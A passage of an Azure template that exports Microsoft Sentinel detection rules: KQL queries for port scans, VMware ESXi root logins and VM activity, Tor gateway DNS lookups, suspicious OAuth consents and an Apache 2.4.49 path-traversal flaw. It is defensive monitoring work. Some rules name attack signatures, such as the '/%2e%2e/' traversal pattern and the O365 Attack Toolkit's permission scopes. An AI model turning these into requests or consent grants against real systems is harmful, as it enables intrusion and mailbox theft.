 !has \"40.125.122.151\"\n| where SrcIpAddr  !has \"20.50.80.210\"\n| where SrcIpAddr  !has \"40.79.150.121\"\n| where SrcIpAddr  !has \"20.190.132.42\"\n| where SrcIpAddr  !has \"20.190.132.106\"\n| where SrcIpAddr  !has \"23.56.0.62\"\n| where SrcIpAddr  !has \"52.115.248.99\"\n| where SrcIpAddr  !has \"34.216.57.215\"\n| where EventResult !has \"Failure\"\n| summarize\n    AttemptedPortsCount=dcount(DstPortNumber),\n    AttemptedPorts=make_set(DstPortNumber, 100),\n    ReportedBy=make_set(strcat(EventVendor, \"/\", EventProduct), 20)\n    by SrcIpAddr, bin(TimeGenerated, 5m)\n| where AttemptedPortsCount > PortScanThreshold",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Reconnaissance"
          ],
          "techniques": [
            "T1595"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": true,
              "lookbackDuration": "P1D",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b1546904-c0dc-4f08-9b71-c436ca9a4dc5')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b1546904-c0dc-4f08-9b71-c436ca9a4dc5')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - Multiple VMs stopped",
          "description": "Detects when multiple VMs ware stopped by user.",
          "severity": "Medium",
          "enabled": true,
          "query": "let threshold = 5;\nVMwareESXi\n| where SyslogMessage has ('VmPoweredOffEvent')\n| extend SrcUsername = extract(@'\\[info\\]\\s+\\[(.*?)\\]', 1, SyslogMessage)\n| extend DstHostname = extract(@'\\[\\d+\\]\\s+\\[(.*?)\\s+on', 1, SyslogMessage)\n| summarize st_vm = makeset(DstHostname) by SrcUsername, bin(TimeGenerated, 5m)\n| where array_length(st_vm) > threshold\n| extend HostCustomEntity = st_vm, AccountCustomEntity = SrcUsername\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/291b5c2c-e8eb-4da5-8696-9710c6d2c39c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/291b5c2c-e8eb-4da5-8696-9710c6d2c39c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - Multiple new VMs started",
          "description": "Detects when multiple new VMs were started.",
          "severity": "Medium",
          "enabled": true,
          "query": "let threshold = 5;\nlet a_vm = \nVMwareESXi\n| where SyslogMessage has ('VmPoweredOnEvent')\n| extend DstHostname = extract(@'\\[\\d+\\]\\s+\\[(.*?)\\s+on', 1, SyslogMessage)\n| summarize vm_l = makeset(DstHostname)\n| extend k=1;\nVMwareESXi\n| where SyslogMessage has ('VmPoweredOnEvent')\n| extend DstHostname = extract(@'\\[\\d+\\]\\s+\\[(.*?)\\s+on', 1, SyslogMessage)\n| extend SrcUsername = extract(@'\\[info\\]\\s+\\[(.*?)\\]', 1, SyslogMessage)\n| extend k = 1\n| join (a_vm) on k\n| where vm_l !has DstHostname\n| summarize n_vm = makeset(DstHostname) by SrcUsername, bin(TimeGenerated, 10m)\n| where array_length(n_vm) >= threshold\n| extend HostCustomEntity = n_vm\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/47e81bf5-5783-4908-a68b-4e5330f28d78')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/47e81bf5-5783-4908-a68b-4e5330f28d78')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - Low temp directory space",
          "description": "This rule is triggered when temp directory space is detected.",
          "severity": "Medium",
          "enabled": true,
          "query": "let threshold = 10;\nVMwareESXi\n| where SyslogMessage has_all ('Temp directory', 'free space')\n| extend sp = toreal(extract(@'free space is:\\s(\\d+)', 1, SyslogMessage)) / 1000000000\n| where sp < threshold\n| extend h = 'Hypervisor'\n| extend HostCustomEntity = h\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8095a4fa-5c08-44fc-9371-c70654bb2e7b')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8095a4fa-5c08-44fc-9371-c70654bb2e7b')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - Shared or stolen root account",
          "description": "Detects when shared or stolen root account.",
          "severity": "Medium",
          "enabled": true,
          "query": "VMwareESXi\n| where SyslogMessage has_all ('UserLoginSessionEvent', 'root', 'logged in')\n| extend SrcIpAddr = extract(@'root@(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})', 1, SyslogMessage)\n| summarize count() by SrcIpAddr, bin(TimeGenerated, 15m)\n| extend IPCustomEntity = SrcIpAddr\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 1,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "PrivilegeEscalation"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a6001224-a01e-4350-a896-029792459873')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a6001224-a01e-4350-a896-029792459873')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Create incidents based on Microsoft Defender for Endpoint alerts",
          "description": "Create incidents based on all alerts generated in Microsoft Defender for Endpoint",
          "enabled": true,
          "productFilter": "Microsoft Defender Advanced Threat Protection",
          "severitiesFilter": [
            "Informational"
          ],
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": [
            "Unsanctioned cloud app access was blocked"
          ],
          "alertRuleTemplateName": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2fd23a88-9e07-43f5-8632-f9de172e49ab')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2fd23a88-9e07-43f5-8632-f9de172e49ab')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - Root login",
          "description": "Detects when root user login.",
          "severity": "Medium",
          "enabled": true,
          "query": "VMwareESXi\n| where SyslogMessage has_all ('UserLoginSessionEvent', 'root', 'logged in')\n| extend SrcIpAddr = extract(@'root@(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})', 1, SyslogMessage)\n| extend IPCustomEntity = SrcIpAddr\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "PrivilegeEscalation"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/af8e42b6-a42a-4a35-b7df-22af952a06c8')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/af8e42b6-a42a-4a35-b7df-22af952a06c8')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - Unexpected disk image",
          "description": "Detects unexpected disk image for VM.",
          "severity": "Medium",
          "enabled": true,
          "query": "let img_ =\nVMwareESXi\n| where SyslogMessage has ('Matched discovered VM')\n| extend DstHostname = extract(@'vim.VirtualMachine\\S+,(.*?)\\]', 1, SyslogMessage)\n| extend kImageName = extract(@'ds:///vmfs/volumes/(.*)/(.*?),', 2, SyslogMessage)\n| summarize img_lst = makeset(kImageName) by DstHostname;\nVMwareESXi\n| where SyslogMessage has ('Matched discovered VM')\n| extend DstHostname = extract(@'vim.VirtualMachine\\S+,(.*?)\\]', 1, SyslogMessage)\n| extend ImageName = extract(@'ds:///vmfs/volumes/(.*)/(.*?),', 2, SyslogMessage)\n| join (img_) on DstHostname\n| where img_lst !has ImageName\n| extend HostCustomEntity = DstHostname\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d53c8422-531f-484e-a9fd-ebd78d2271af')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d53c8422-531f-484e-a9fd-ebd78d2271af')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - Root impersonation",
          "description": "Detects when root impersonation occurs.",
          "severity": "Medium",
          "enabled": true,
          "query": "VMwareESXi\n| where SyslogMessage has_all ('ImpersonateUser', 'VcIntegrity', 'root')\n| extend user = 'root'\n| extend AccountCustomEntity = user\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d3bd6532-d53b-4f39-9973-af4a32f9cb87')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d3bd6532-d53b-4f39-9973-af4a32f9cb87')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "DNS events related to ToR proxies",
          "description": "Identifies IP addresses performing DNS lookups associated with common ToR proxies.",
          "severity": "Low",
          "enabled": true,
          "query": "DnsEvents\n| where Name contains \".\"\n| where Name has_any (\"tor2web.org\", \"tor2web.com\", \"torlink.co\", \"onion.to\", \"onion.ink\", \"onion.cab\", \"onion.nu\", \"onion.link\",\n\"onion.it\", \"onion.city\", \"onion.direct\", \"onion.top\", \"onion.casa\", \"onion.plus\", \"onion.rip\", \"onion.dog\", \"tor2web.fi\",\n\"tor2web.blutmagie.de\", \"onion.sh\", \"onion.lu\", \"onion.pet\", \"t2w.pw\", \"tor2web.ae.org\", \"tor2web.io\", \"tor2web.xyz\", \"onion.lt\",\n\"s1.tor-gateways.de\", \"s2.tor-gateways.de\", \"s3.tor-gateways.de\", \"s4.tor-gateways.de\", \"s5.tor-gateways.de\", \"hiddenservice.net\")\n| extend HostName = iff(Computer has '.', substring(Computer,0,indexof(Computer,'.')),Computer)\n| extend DnsDomain = iff(Computer has '.', substring(Computer,indexof(Computer,'.')+1),\"\")\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1048"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a83ef0f4-dace-4767-bce3-ebd32599d2a0",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ClientIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f5e62a4f-1be7-4858-bfdd-0d6af8051add')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f5e62a4f-1be7-4858-bfdd-0d6af8051add')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Suspicious application consent similar to O365 Attack Toolkit",
          "description": "This will alert when a user consents to provide a previously-unknown Azure application with the same OAuth permissions used by the MDSec O365 Attack Toolkit (https://github.com/mdsecactivebreach/o365-attack-toolkit).\nThe default permissions/scope for the MDSec O365 Attack toolkit change sometimes but often include contacts.read, user.read, mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send, files.read, and files.read.all.\nConsent to applications with these permissions should be rare, especially as the knownApplications list is expanded, especially as the knownApplications list is expanded. Public contributions to expand this filter are welcome!\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.",
          "severity": "High",
          "enabled": true,
          "query": "let detectionTime = 1d;\nlet joinLookback = 14d;\nlet threshold = 5;\nlet o365_attack_regex = \"contacts.read|user.read|mail.read|notes.read.all|mailboxsettings.readwrite|Files.ReadWrite.All|mail.send|files.read|files.read.all\";\nlet o365_attack = dynamic([\"contacts.read\", \"user.read\", \"mail.read\", \"notes.read.all\", \"mailboxsettings.readwrite\", \"Files.ReadWrite.All\", \"mail.send\", \"files.read\", \"files.read.all\"]);\nAuditLogs\n| where TimeGenerated > ago(detectionTime)\n| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"ApplicationManagement\"\n| where OperationName =~ \"Consent to application\"\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"ServicePrincipal\"\n      | extend AppDisplayName = tostring(TargetResource.displayName),\n               AppClientId = tostring(TargetResource.id),\n               props = TargetResource.modifiedProperties\n  )\n| where AppClientId !in ((externaldata(knownAppClientId:string, knownAppDisplayName:string)[@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Microsoft.OAuth.KnownApplications.csv\"] with (format=\"csv\"))) // NOTE: a MATCH from this list will cause the alert to NOT fire - please modify for your environment!\n| mv-apply ConsentFull = props on \n  (\n      where ConsentFull.displayName =~ \"ConsentAction.Permissions\"\n  )\n| parse ConsentFull with * \"ConsentType: \" GrantConsentType \", Scope: \" GrantScope1 \", CreatedDateTime\" * \"]\" *\n| where GrantConsentType != \"AllPrincipals\" // NOTE: we are ignoring if OAuth application was granted to all users via an admin - but admin due diligence should be audited occasionally\n| where ConsentFull has_any (o365_attack)  \n| extend GrantScopeCount = countof(tolower(GrantScope1), o365_attack_regex, 'regex')\n| where GrantScopeCount > threshold\n| extend GrantInitiatedByAppName = tostring(InitiatedBy.app.displayName)\n| extend GrantInitiatedByAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend GrantInitiatedByUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend GrantInitiatedByAadUserId = tostring(InitiatedBy.user.id)\n| extend GrantIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), tostring(InitiatedBy.user.ipAddress), tostring(InitiatedBy.app.ipAddress))\n| extend GrantInitiatedBy = iff(isnotempty(GrantInitiatedByUserPrincipalName), GrantInitiatedByUserPrincipalName, GrantInitiatedByAppName)\n| mv-apply AdditionalDetail = AdditionalDetails on \n  (\n      where AdditionalDetail.key =~ \"User-Agent\"\n      | extend GrantUserAgent = AdditionalDetail.value\n  )\n| project TimeGenerated, GrantConsentType, GrantScope1, GrantInitiatedBy, AppDisplayName, GrantInitiatedByUserPrincipalName, GrantInitiatedByAadUserId, GrantInitiatedByAppName, GrantInitiatedByAppServicePrincipalId, GrantIpAddress, GrantUserAgent, AppClientId, OperationName, ConsentFull, CorrelationId\n| join kind = leftouter (AuditLogs\n  | where TimeGenerated > ago(joinLookback)\n  | where LoggedByService =~ \"Core Directory\"\n  | where Category =~ \"ApplicationManagement\"\n  | where OperationName =~ \"Add service principal\"\n  | mv-apply TargetResource = TargetResources on \n      (\n          where TargetResource.type =~ \"ServicePrincipal\"\n          | extend props = TargetResource.modifiedProperties,\n                  AppClientId = tostring(TargetResource.id)\n      )\n  | mv-apply Property = props on \n      (\n          where Property.displayName =~ \"AppAddress\" and Property.newValue has \"AddressType\"\n          | extend AppReplyURLs = trim('\"',tostring(Property.newValue))\n      )\n  | distinct AppClientId, tostring(AppReplyURLs)\n) on AppClientId\n| join kind = innerunique (AuditLogs\n      | where TimeGenerated > ago(joinLookback)\n      | where LoggedByService =~ \"Core Directory\"\n      | where Category =~ \"ApplicationManagement\"\n      | where OperationName =~ \"Add OAuth2PermissionGrant\" or OperationName =~ \"Add delegated permission grant\"\n          | mv-apply TargetResource = TargetResources on \n          (\n              where TargetResource.type =~ \"ServicePrincipal\" and array_length(TargetResource.modifiedProperties) > 0 and isnotnull(TargetResource.displayName)\n              | extend GrantAuthentication = tostring(TargetResource.displayName)\n          )\n      | extend GrantOperation = OperationName\n      | project GrantAuthentication, GrantOperation, CorrelationId\n  ) on CorrelationId\n| project TimeGenerated, GrantConsentType, GrantScope1, GrantInitiatedBy, AppDisplayName, AppReplyURLs, GrantInitiatedByUserPrincipalName, GrantInitiatedByAadUserId, GrantInitiatedByAppName, GrantInitiatedByAppServicePrincipalId, GrantIpAddress, GrantUserAgent, AppClientId, GrantAuthentication, OperationName, GrantOperation, CorrelationId, ConsentFull\n| extend Name = tostring(split(GrantInitiatedByUserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(GrantInitiatedByUserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1528",
            "T1550"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "f948a32f-226c-4116-bddd-d95e91d97eb9",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "GrantInitiatedByUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "GrantInitiatedByAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "GrantInitiatedByAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "GrantIpAddress"
                }
              ]
            },
            {
              "entityType": "CloudApplication",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AppDisplayName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/af88ea6a-400f-4aaa-9eb1-50fb4ed5ebc3')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/af88ea6a-400f-4aaa-9eb1-50fb4ed5ebc3')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Apache - Apache 2.4.49 flaw CVE-2021-41773",
          "description": "Detects using Apache 2.4.49 flaw CVE-2021-41773",
          "severity": "Medium",
          "enabled": true,
          "query": "ApacheHTTPServer\n| where HttpRequestMethod =~ \"GET\"\n| where UrlOriginal contains \"/cgi-bin/\" and UrlOriginal contains \"/%2e%2e/\"\n| where HttpStatusCode == \"200\" \n| extend UrlCustomEntity = UrlOriginal\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "LateralMovement"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5c600118-411d-49d2-b6e0-485af18e073f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5c600118-411d-49d2-b6e0-485af18e073f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NGINX - Request to sensitive files",
          "description": "Detects request to sensitive files.",
          "severity": "Medium",
          "enabled": true,
